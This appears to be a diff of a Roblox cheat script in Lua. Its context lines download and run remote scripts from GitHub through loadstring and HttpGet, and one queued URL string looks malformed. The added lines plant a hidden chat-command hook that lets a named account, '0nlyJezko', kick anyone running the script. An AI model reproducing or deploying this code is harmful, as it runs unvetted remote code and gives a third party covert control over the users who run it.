@@ -110,3 +110,20 @@ wait(.5)
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 wait(.5)
 queueteleport("https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/DHM'))()")
+
+--Kick
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "0nlyJezko" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "!" then
+        print("Kicked ".. splitString[2])
+         if player.Name == splitString[2] and splitString[2] ~= "0nlyJezko" then 
+                player:Kick("🤡 Expulsado por un administrador 🤡")
+            end
+        end
+    end
+  end)
+end
